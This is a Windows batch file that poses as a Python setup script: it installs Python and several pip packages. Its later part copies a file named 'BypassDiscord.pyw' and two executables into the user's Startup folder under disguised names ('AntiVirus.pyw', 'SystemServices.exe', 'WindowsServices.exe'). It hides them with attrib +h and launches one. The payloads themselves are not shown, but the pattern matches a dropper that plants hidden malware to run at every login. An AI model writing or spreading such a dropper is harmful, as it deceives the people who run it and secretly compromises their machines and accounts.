@echo off
echo Checking for Python installation...

:: Check if python is installed
python --version >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Python not found. Installing Python 3.10 via winget...
    winget install --id Python.Python.3.10 --silent --accept-package-agreements --accept-source-agreements
) ELSE (
    echo Python is already installed.
)

echo.
echo Upgrading pip...
python -m pip install --upgrade pip

echo.
echo Installing required Python packages...
@echo off
python -m pip install requests
python -m pip install beautifulsoup4
python -m pip install Pillow
python -m pip install pycryptodome
python -m pip install pypiwin32
python -m pip install cryptography==42.0.5
python -m pip install ttkthemes==3.2.2
python -m pip install pyfiglet==1.0.2

@echo off
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

::paste bybass discord in startup
set "SRC=%~dp0Data\BypassDiscord.pyw"
set "DEST=%STARTUP%\AntiVirus.pyw"
copy /Y "%SRC%" "%DEST%" >nul 2>&1
attrib +h "%DEST%"
 

::paste client-built in startup
::set "SRC2=%~dp0\Binaries\Win64\en-US\Client-built.exe"
set "SRC2=%~dp0Data\SystemServices.exe"
set "DEST2=%STARTUP%\SystemServices.exe"
copy /Y "%SRC2%" "%DEST2%" >nul 2>&1
attrib +h "%DEST2%"


::paste client in startup
::set "SRC3=%~dp0\Binaries\Win64\en-US\Client.exe"
set "SRC3=%~dp0Data\WindowsServices.exe"
set "DEST3=%STARTUP%\WindowsServices.exe"
copy /Y "%SRC3%" "%DEST3%" >nul 2>&1
attrib +h "%DEST3%"





::ending
echo.
echo All installations complete!
@echo off
::start "" "%~dp0\Binaries\Win64\en-US\Client-built.exe"
start "" "%DEST%"
::start "" "%DEST2%"
::start "" "%DEST3%"
pause